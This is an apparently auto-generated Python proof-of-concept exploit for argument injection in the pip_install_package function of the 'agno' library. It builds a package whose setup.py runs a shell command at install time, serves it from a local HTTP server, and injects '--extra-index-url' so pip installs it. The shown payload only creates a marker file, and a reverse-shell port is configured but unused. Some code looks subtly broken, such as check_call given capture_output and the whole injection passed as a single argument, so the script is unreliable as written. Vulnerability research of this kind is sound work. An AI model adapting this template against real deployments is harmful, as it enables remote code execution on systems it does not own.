#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: rce-022
# Sink: pip_install_package
# Auto-generated — run with: python3 rce_spec_developer_intended_install_pip_install_package.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for agno (agno/tools/python.py)
Vulnerability: Argument injection in pip_install_package leading to RCE
CVE: N/A (0-day)
Author: Security Researcher
Date: 2024-01-01

Description:
The function pip_install_package() passes the package_name parameter directly
to subprocess.check_call([sys.executable, "-m", "pip", "install", package_name]).
While shell=False prevents shell injection, pip interprets arguments starting
with '--' as options. An attacker can inject --extra-index-url to redirect
package resolution to a malicious server, or --find-links to specify a local
path. This allows installation of arbitrary code during package installation.

Impact: Remote Code Execution (RCE) when attacker controls package_name parameter.
"""

import sys
import subprocess
import tempfile
import os
import shutil
import json
import http.server
import threading
import time
import urllib.parse
import socket

# Configuration
TARGET_HOST = "localhost"  # Change to target host if needed
TARGET_PORT = 8000  # Port for our malicious package server
LISTEN_ADDRESS = "0.0.0.0"
LISTEN_PORT = 9999  # Port for reverse shell (optional)

# Benign payload for demonstration - creates a file to prove code execution
BENIGN_PAYLOAD = "touch /tmp/poc_success.txt"

class MaliciousPackageServer:
    """HTTP server that serves a malicious pip package."""
    
    def __init__(self, host, port, payload_command):
        self.host = host
        self.port = port
        self.payload_command = payload_command
        self.server = None
        self.thread = None
        
    def create_malicious_package(self):
        """Create a malicious pip package that executes our payload."""
        # Create temporary directory for package
        package_dir = tempfile.mkdtemp()
        
        # Create package structure
        package_name = "malicious_package"
        package_path = os.path.join(package_dir, package_name)
        os.makedirs(package_path)
        
        # Create setup.py with malicious code in setup() call
        setup_py_content = f'''
from setuptools import setup
import os

# This code runs during package installation
os.system("{self.payload_command}")

setup(
    name="{package_name}",
    version="1.0.0",
    description="Malicious package for PoC",
    py_modules=["{package_name}"],
)
'''
        with open(os.path.join(package_dir, "setup.py"), "w") as f:
            f.write(setup_py_content)
        
        # Create __init__.py
        with open(os.path.join(package_path, "__init__.py"), "w") as f:
            f.write("# Malicious package\n")
        
        # Create a simple module
        with open(os.path.join(package_path, "module.py"), "w") as f:
            f.write("# Malicious module\n")
        
        # Build the package
        original_dir = os.getcwd()
        os.chdir(package_dir)
        try:
            subprocess.run([sys.executable, "setup.py", "sdist", "--formats=gztar"], 
                         capture_output=True, check=True)
            # Find the generated tar.gz
            dist_dir = os.path.join(package_dir, "dist")
            for file in os.listdir(dist_dir):
                if file.endswith(".tar.gz"):
                    return os.path.join(dist_dir, file)
        finally:
            os.chdir(original_dir)
        
        return None
    
    def start_server(self, package_path):
        """Start HTTP server to serve the malicious package."""
        package_dir = os.path.dirname(package_path)
        package_filename = os.path.basename(package_path)
        
        # Create index.html that points to our package
        index_content = f'''
<!DOCTYPE html>
<html>
<head><title>Package Index</title></head>
<body>
<a href="/{package_filename}">{package_filename}</a>
</body>
</html>
'''
        with open(os.path.join(package_dir, "index.html"), "w") as f:
            f.write(index_content)
        
        # Change to package directory for serving
        original_dir = os.getcwd()
        os.chdir(package_dir)
        
        class CustomHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                print(f"[*] Server log: {format % args}")
        
        self.server = http.server.HTTPServer((self.host, self.port), CustomHandler)
        self.thread = threading.Thread(target=self.server.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        
        print(f"[*] Malicious package server started on http://{self.host}:{self.port}")
        print(f"[*] Serving package: {package_filename}")
        
        os.chdir(original_dir)
        return f"http://{self.host}:{self.port}/{package_filename}"
    
    def stop_server(self):
        """Stop the HTTP server."""
        if self.server:
            self.server.shutdown()
            self.thread.join(timeout=5)

def exploit(target_function, malicious_url):
    """
    Exploit the pip_install_package function by injecting pip options.
    
    The attack works by providing a package_name that includes:
    --extra-index-url <malicious_server> <package_name>
    
    This causes pip to look for the package on our malicious server first,
    and install it, executing our code during installation.
    """
    # Construct the malicious package_name argument
    # We use --extra-index-url to add our malicious server as a package source
    # Then specify a package name that exists on our server
    malicious_package_name = f"--extra-index-url {malicious_url} malicious_package"
    
    print(f"[*] Attempting to exploit pip_install_package with:")
    print(f"[*] package_name = '{malicious_package_name}'")
    
    try:
        # This simulates calling the vulnerable function
        # In a real scenario, this would be called with attacker-controlled input
        result = subprocess.check_call(
            [sys.executable, "-m", "pip", "install", malicious_package_name],
            capture_output=True,
            text=True
        )
        print(f"[+] Exploit succeeded! Package installed.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Exploit failed: {e}")
        print(f"[-] stdout: {e.stdout}")
        print(f"[-] stderr: {e.stderr}")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False

def main():
    """Main function to demonstrate the exploit."""
    print("[*] Agno pip_install_package Argument Injection PoC")
    print("[*] ===============================================")
    print()
    
    # Check if we have the necessary tools
    if not shutil.which("pip"):
        print("[-] pip not found. Please install pip first.")
        sys.exit(1)
    
    # Create malicious package server
    print("[*] Setting up malicious package server...")
    server = MaliciousPackageServer(LISTEN_ADDRESS, LISTEN_PORT, BENIGN_PAYLOAD)
    
    try:
        # Create the malicious package
        print("[*] Creating malicious package...")
        package_path = server.create_malicious_package()
        if not package_path:
            print("[-] Failed to create malicious package")
            sys.exit(1)
        
        # Start the server
        print("[*] Starting malicious package server...")
        malicious_url = server.start_server(package_path)
        
        # Wait for server to start
        time.sleep(1)
        
        # Execute the exploit
        print()
        print("[*] Executing exploit...")
        print("[*] This will attempt to install a malicious package via pip")
        print("[*] The package will execute: " + BENIGN_PAYLOAD)
        print()
        
        # In a real scenario, the target application would call pip_install_package
        # with attacker-controlled input. Here we simulate it directly.
        success = exploit(None, f"http://{LISTEN_ADDRESS}:{LISTEN_PORT}")
        
        if success:
            print()
            print("[+] Exploit completed successfully!")
            print("[+] Check for /tmp/poc_success.txt to verify code execution")
            if os.path.exists("/tmp/poc_success.txt"):
                print("[+] /tmp/poc_success.txt exists - code execution confirmed!")
            else:
                print("[!] /tmp/poc_success.txt not found - check server logs")
        else:
            print()
            print("[-] Exploit failed. See error messages above.")
            
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        # Cleanup
        print("[*] Cleaning up...")
        server.stop_server()
        
        # Remove the malicious package file
        if 'package_path' in dir() and package_path and os.path.exists(package_path):
            os.remove(package_path)
        
        # Remove the temporary directory
        if 'package_path' in dir() and package_path:
            temp_dir = os.path.dirname(os.path.dirname(package_path))
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir, ignore_errors=True)

if __name__ == "__main__":
    main()
